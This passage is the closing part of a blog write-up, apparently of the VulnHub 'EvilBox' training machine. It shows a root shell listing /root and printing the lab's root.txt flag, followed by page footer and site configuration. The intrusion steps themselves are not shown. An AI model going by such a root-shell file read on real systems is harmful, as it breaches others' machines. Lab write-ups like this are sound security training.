+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">18</span> root root <span class="m">4096</span> Aug <span class="m">16</span>  <span class="m">2021</span> ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">16</span>  <span class="m">2021</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">3526</span> Aug <span class="m">16</span>  <span class="m">2021</span> .bashrc
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">16</span>  <span class="m">2021</span> .local
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
+</span></span><span class="line"><span class="cl">-r--------  <span class="m">1</span> root root   <span class="m">31</span> Aug <span class="m">16</span>  <span class="m">2021</span> root.txt
+</span></span><span class="line"><span class="cl">root@EvilBoxOne:/home/mowree# cat /root/root.txt
+</span></span><span class="line"><span class="cl">36QtXfdJWvdC0VavlPIApUbDlqTsBM
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, that;s all.</p>
+<h2 id="notes">Notes</h2></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-11-10</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-evilbox/" data-title="Vulnhub Evilbox" data-via="@YaoyaoShaw" data-hashtags="Vulnhub"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-evilbox/" data-hashtag="Vulnhub"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-evilbox/" data-title="Vulnhub Evilbox"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-evilbox/" data-title="Vulnhub Evilbox"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-evilbox/" data-title="Vulnhub Evilbox"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/vulnhub/">Vulnhub</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2023/11/vulnhub_hackme1/" class="prev" rel="prev" title="Vulnhub Hackme"><i class="fas fa-angle-left fa-fw"></i>Vulnhub Hackme</a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
